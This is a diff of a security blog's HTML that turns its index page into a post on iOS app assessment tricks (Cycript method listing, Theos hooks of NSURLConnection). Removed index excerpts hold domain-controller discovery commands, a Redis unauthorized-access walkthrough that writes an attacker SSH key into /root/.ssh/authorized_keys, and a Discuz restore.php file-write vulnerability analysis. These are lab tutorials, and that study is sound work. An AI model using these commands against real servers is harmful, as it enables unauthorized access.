@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Smilent, Security" />
+  <meta name="keywords" content="iOS,cycript,theos,MSHookMessageEx," />
 
 
 
@@ -86,15 +86,22 @@
 
 
 
-<meta name="description" content="Smilent&apos;s Blog">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Smilent">
-<meta property="og:url" content="http://blog.smilent.me/index.html">
+<meta name="description" content="iOS Security总结iOS App安全评估所用到的一些trick。
+Cycript打印指定类的所用的方法：
+123456789101112function printMethods(className, isa) &amp;#123;  var count = new new Type(&quot;I&quot;);  var classObj = (isa != undefined) ? objc_getClass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="iOS Security Tricks">
+<meta property="og:url" content="http://blog.smilent.me/2016-11-22-iOS-security-tricks.html">
 <meta property="og:site_name" content="Smilent">
-<meta property="og:description" content="Smilent&apos;s Blog">
+<meta property="og:description" content="iOS Security总结iOS App安全评估所用到的一些trick。
+Cycript打印指定类的所用的方法：
+123456789101112function printMethods(className, isa) &amp;#123;  var count = new new Type(&quot;I&quot;);  var classObj = (isa != undefined) ? objc_getClass">
+<meta property="og:updated_time" content="2016-11-22T10:56:46.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Smilent">
-<meta name="twitter:description" content="Smilent&apos;s Blog">
+<meta name="twitter:title" content="iOS Security Tricks">
+<meta name="twitter:description" content="iOS Security总结iOS App安全评估所用到的一些trick。
+Cycript打印指定类的所用的方法：
+123456789101112function printMethods(className, isa) &amp;#123;  var count = new new Type(&quot;I&quot;);  var classObj = (isa != undefined) ? objc_getClass">
 
 
 
@@ -112,7 +119,7 @@
   };
 </script>
 
-  <title> Smilent </title>
+  <title> iOS Security Tricks | Smilent </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -133,9 +140,7 @@
     
   
 
-  <div class="container one-collumn sidebar-position-left 
-   page-home 
- ">
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -232,9 +237,9 @@
         <div class="content-wrap">
           <div id="content" class="content">
             
-  <section id="posts" class="posts-expand">
+
+  <div id="posts" class="posts-expand">
     
-      
 
   
   
@@ -254,10 +259,7 @@
             
             
               
-                
-                <a class="post-title-link" href="/2016-11-22-iOS-security-tricks.html" itemprop="url">
-                  iOS Security Tricks
-                </a>
+                iOS Security Tricks
               
             
           </h1>
@@ -332,9 +334,7 @@
       
 
       
-        
-          
-            <h1 id="iOS-Security"><a href="#iOS-Security" class="headerlink" title="iOS Security"></a>iOS Security</h1><p>总结iOS App安全评估所用到的一些trick。</p>
+        <h1 id="iOS-Security"><a href="#iOS-Security" class="headerlink" title="iOS Security"></a>iOS Security</h1><p>总结iOS App安全评估所用到的一些trick。</p>
 <h1 id="Cycript"><a href="#Cycript" class="headerlink" title="Cycript"></a>Cycript</h1><p>打印指定类的所用的方法：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">printMethods</span>(<span class="params">className, isa</span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> count = <span class="keyword">new</span> <span class="keyword">new</span> Type(<span class="string">"I"</span>);</div><div class="line">  <span class="keyword">var</span> classObj = (isa != <span class="literal">undefined</span>) ? objc_getClass(className)-&gt;isa : objc_getClass(className);</div><div class="line">  <span class="keyword">var</span> methods = class_copyMethodList(classObj, count);</div><div class="line">  <span class="keyword">var</span> methodsArray = [];</div><div class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; *count; i++) &#123;</div><div class="line">    <span class="keyword">var</span> method = methods[i];</div><div class="line">    methodsArray.push(&#123;<span class="attr">selector</span>:method_getName(method), <span class="attr">implementation</span>:method_getImplementation(method)&#125;);</div><div class="line">  &#125;</div><div class="line">  free(methods);</div><div class="line">  <span class="keyword">return</span> methodsArray;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>寻找Button的事件响应防范：</p>
@@ -358,576 +358,64 @@
 <h1 id="Logs语法"><a href="#Logs语法" class="headerlink" title="Logs语法"></a>Logs语法</h1><p>hook NSURLConnection</p>
 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">%hook NSURLConnection</div><div class="line">+ (NSData *)sendSynchronousRequest:(NSURLRequest *)request returningResponse:(NSURLResponse **)response error:(NSError **)error</div><div class="line">&#123;</div><div class="line">    %<span class="built_in">log</span>;</div><div class="line">    NSData * origResult = %orig(request, response, error);</div><div class="line">    <span class="keyword">return</span> origResult;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">+ (<span class="keyword">void</span>)sendAsynchronousRequest:(NSURLRequest *)request <span class="built_in">queue</span>:(NSOperationQueue *)<span class="built_in">queue</span> completionHandler:(<span class="keyword">void</span> (^)(NSURLResponse* response, NSData* data, NSError* connectionError)) handler &#123;</div><div class="line">    NSLog(@<span class="string">"Handler %@ "</span>, handler);</div><div class="line">    <span class="comment">//Hook block function</span></div><div class="line">    <span class="keyword">void</span> (^customBlock)(NSURLResponse *resp, NSData *da, NSError *err) = ^(NSURLResponse *resp, NSData *da, NSError *err)&#123;</div><div class="line">        NSLog(@<span class="string">"%@"</span>, resp);</div><div class="line">    &#125;;</div><div class="line">%orig(request, <span class="built_in">queue</span>, customBlock);</div><div class="line">&#125;</div><div class="line"></div><div class="line">%end</div></pre></td></tr></table></figure>
 
-          
+      
+    </div>
+
+    <div>
+      
         
       
     </div>
 
     <div>
       
-    </div>
+        
 
-    <div>
       
     </div>
 
     <footer class="post-footer">
       
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016-06-06-find-domain-controller.html" itemprop="url">
-                  Find Domain Controller
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-06-06T00:00:00+08:00" content="2016-06-06">
-              2016-06-06
-            </time>
-          </span>
-
+        <div class="post-tags">
           
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
+            <a href="/tags/iOS/" rel="tag">#iOS</a>
           
-
+            <a href="/tags/cycript/" rel="tag">#cycript</a>
           
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016-06-06-find-domain-controller.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016-06-06-find-domain-controller.html" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
+            <a href="/tags/theos/" rel="tag">#theos</a>
           
-
-          
-
-          
-          
-             <span id="/2016-06-06-find-domain-controller.html" class="leancloud_visitors" data-flag-title="Find Domain Controller">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
+            <a href="/tags/MSHookMessageEx/" rel="tag">#MSHookMessageEx</a>
           
         </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
       
-        
-          
-            <h2 id="0x00-Find-Domain-Controller-via-DNS"><a href="#0x00-Find-Domain-Controller-via-DNS" class="headerlink" title="0x00 Find Domain Controller via DNS"></a>0x00 Find Domain Controller via DNS</h2><blockquote>
-<p><a href="https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/" target="_blank" rel="external">https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/</a></p>
-</blockquote>
-<p>DC may be  the default DNS server.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">C:\Users\dm1&gt;nslookup -type=SRV _ldap._tcp</div><div class="line"></div><div class="line">DNS request timed out.</div><div class="line"></div><div class="line">    timeout was 2 seconds.</div><div class="line"></div><div class="line">服务器:  UnKnown</div><div class="line"></div><div class="line">Address:  192.168.72.134</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">_ldap._tcp.corp.sm.com  SRV service location:</div><div class="line"></div><div class="line">          priority       = 0</div><div class="line"></div><div class="line">          weight         = 100</div><div class="line"></div><div class="line">          port           = 389</div><div class="line"></div><div class="line">          svr hostname   = win-dc.corp.sm.com</div><div class="line"></div><div class="line">win-dc.corp.sm.com      internet address = 192.168.72.134</div></pre></td></tr></table></figure>
-<p>or ifconfig.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ifconfig /all</div></pre></td></tr></table></figure>
-<h2 id="0x01-dsquery-with-Windows-2003"><a href="#0x01-dsquery-with-Windows-2003" class="headerlink" title="0x01 dsquery with Windows 2003"></a>0x01 dsquery with Windows 2003</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dsquery computer</div></pre></td></tr></table></figure>
-<h2 id="0x02-net-group"><a href="#0x02-net-group" class="headerlink" title="0x02 net group"></a>0x02 net group</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net group &quot;Domain Controllers&quot; /domain</div></pre></td></tr></table></figure>
-<h2 id="0x03-net-time"><a href="#0x03-net-time" class="headerlink" title="0x03 net time"></a>0x03 net time</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net time /domain</div></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
             
+              <a href="/2016-06-06-find-domain-controller.html" rel="next" title="Find Domain Controller">
+                <i class="fa fa-chevron-left"></i> Find Domain Controller
+              </a>
             
-              
-                
-                <a class="post-title-link" href="/2016-05-25-linux-crontab-rebound-shell-hole.html" itemprop="url">
-                  Linux crontab back Shell
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-05-25T00:00:00+08:00" content="2016-05-25">
-              2016-05-25
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016-05-25-linux-crontab-rebound-shell-hole.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016-05-25-linux-crontab-rebound-shell-hole.html" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2016-05-25-linux-crontab-rebound-shell-hole.html" class="leancloud_visitors" data-flag-title="Linux crontab back Shell">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用<code>bash</code>反弹shell，一直不成功。查看<code>/var/log/syslog</code></p>
-<p> <img src="http://joychou.org/usr/uploads/2016/05/1700093592.png" alt="1"></p>
-<p>图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出</p>
-<p>所以很惊讶为什么不能够成功，不管是<code>/etc/crontab</code>还是<code>/var/spool/cron/crontabs/</code><br>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2016-05-25-linux-crontab-rebound-shell-hole.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
           </div>
-        
-      
-    </div>
 
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
+          <div class="post-nav-prev post-nav-item">
             
-            
-              
-                
-                <a class="post-title-link" href="/2015-11-10-redis-vulnerability-via-ssh-authorized-keys.html" itemprop="url">
-                  Redis vulnerability via SSH authorized_keys
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-11-10T00:00:00+08:00" content="2015-11-10">
-              2015-11-10
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2015-11-10-redis-vulnerability-via-ssh-authorized-keys.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2015-11-10-redis-vulnerability-via-ssh-authorized-keys.html" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2015-11-10-redis-vulnerability-via-ssh-authorized-keys.html" class="leancloud_visitors" data-flag-title="Redis vulnerability via SSH authorized_keys">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>配置错误的Redis可通过将公钥写入.ssh/authorized_keys，使攻击者拿到服务器权限。</p>
-<h3 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">victim server CentOS6.6+redis2.4  192.168.192.133</div><div class="line"></div><div class="line">attack server CentOS6.6  192.168.192.132</div></pre></td></tr></table></figure>
-<p>先在attack server生成一个公钥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssh-keygen -t rsa -C &quot;redis&quot;</div><div class="line">(echo -e &quot;\n\n&quot;; cat redis.pub; echo -e &quot;\n\n&quot;) &gt; redis.txt</div></pre></td></tr></table></figure></p>
-<p>然后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">redis-cli -h 192.168.192.133 flushall</div><div class="line"></div><div class="line">cat redis.txt | redis-cli -h 192.168.192.133 -x set pwn</div></pre></td></tr></table></figure></p>
-<p>登录redis  redis-cli -h 192.168.192.133<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">CONFIG set dir /root/.ssh/</div><div class="line">config set dbfilename &quot;authorized_keys&quot;</div><div class="line">save</div><div class="line">exit</div></pre></td></tr></table></figure></p>
-<p>然后就可以使用ssh的公钥登录了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -i redis.pub root@192.168.192.133</div></pre></td></tr></table></figure></p>
-<h3 id="0x02-不存在-ssh目录"><a href="#0x02-不存在-ssh目录" class="headerlink" title="0x02 不存在.ssh目录"></a>0x02 不存在.ssh目录</h3><p>当目标服务器上不存在.ssh目录时，Redis是无法创建该目录的，所以可以通过写入crontab的方式来达到命令执行，并反弹shell。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2015-10-16-discuz-utility-restore-vulnerability.html" itemprop="url">
-                  Discuz restore vulnerability
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2015-10-16T00:00:00+08:00" content="2015-10-16">
-              2015-10-16
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index">
-                    <span itemprop="name">web</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2015-10-16-discuz-utility-restore-vulnerability.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2015-10-16-discuz-utility-restore-vulnerability.html" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-             <span id="/2015-10-16-discuz-utility-restore-vulnerability.html" class="leancloud_visitors" data-flag-title="Discuz restore vulnerability">
-               &nbsp; | &nbsp;
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               <span class="post-meta-item-text">阅读次数 </span>
-               <span class="leancloud-visitors-count"></span>
-              </span>
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>restore.php 是discuz官方提供的数据恢复，该工具中存在一个可以恢复任意sql文件的漏洞，从而可以造成插入ucenter管理员帐户，获取uckey，甚至getshell的情况。<br><img src="http://smilent-typecho.stor.sinaapp.com/1152864778.png" alt="d1.png"></p>
-<h3 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h3><p>漏洞出现在<br><a href="http://localhost/utility/restore.php?operation=importzip&amp;datafile_server={file_path}">http://localhost/utility/restore.php?operation=importzip&amp;datafile_server={file_path}</a><br>文件<code>/utility/restore.php</code> 142 行开始，importzip 逻辑中。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//line 157</span></div><div class="line">$backupdir = substr($datafile_server, <span class="number">8</span>, <span class="number">13</span>);</div><div class="line"><span class="comment">//....</span></div><div class="line"><span class="comment">// line 173 </span></div><div class="line"><span class="keyword">foreach</span>($unzip-&gt;Entries <span class="keyword">as</span> $entry) &#123;</div><div class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"/\.sql$/i"</span>, $entry-&gt;Name)) &#123;</div><div class="line">			$fp = fopen(<span class="string">'../data/'</span>.$backupdir.<span class="string">'/'</span>.$entry-&gt;Name, <span class="string">'w'</span>);</div><div class="line">			var_dump($fp);</div><div class="line">			fwrite($fp, $entry-&gt;Data);</div><div class="line">			fclose($fp);</div><div class="line">			$sqlfilecount++;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line"><span class="comment">//....</span></div><div class="line"><span class="comment">//line 118</span></div><div class="line">show_msg(<span class="string">'database_import_multivol_confirm'</span>, $siteurl.<span class="string">'restore.php?operation=import&amp;datafile_server='</span>.$datafile_vol1.<span class="string">'&amp;importsubmit=yes&amp;delunzip=yes'</span>, <span class="string">'confirm'</span>);</div></pre></td></tr></table></figure></p>
-<p>该语句将zip中的.sql文件解压出来。 写到/data目录下。我们可以看到backupdir的值其实是可控的。他是截取datafile_server第9到第14个字符。那么我们传递构造./的方式使路径可控在/data目录下。<br>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2015-10-16-discuz-utility-restore-vulnerability.html#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
           </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
+        </div>
       
 
       
-
-      
-      
-        <div class="post-eof"></div>
       
     </footer>
   </article>
 
 
-    
-  </section>
 
-  
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -935,6 +423,14 @@
 
 
           
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016-11-22-iOS-security-tricks.html"
+           data-title="iOS Security Tricks" data-url="http://blog.smilent.me/2016-11-22-iOS-security-tricks.html">
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -954,8 +450,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview sidebar-panel  sidebar-panel-active ">
+      <section class="site-overview sidebar-panel ">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/images/avatar.gif"
@@ -1046,6 +551,17 @@
 
       </section>
 
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#iOS-Security"><span class="nav-number">1.</span> <span class="nav-text">iOS Security</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Cycript"><span class="nav-number">2.</span> <span class="nav-text">Cycript</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSL-Pinning"><span class="nav-number">3.</span> <span class="nav-text">SSL Pinning</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SSL-Pinning-bypass"><span class="nav-number">4.</span> <span class="nav-text">SSL Pinning bypass</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MobileHooker"><span class="nav-number">5.</span> <span class="nav-text">MobileHooker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MobileHooker-1"><span class="nav-number">6.</span> <span class="nav-text">MobileHooker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Logs语法"><span class="nav-number">7.</span> <span class="nav-text">Logs语法</span></a></li></ol></div>
+            
+          </div>
+        </section>
       
 
     </div>
@@ -1149,6 +665,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
 
   
 
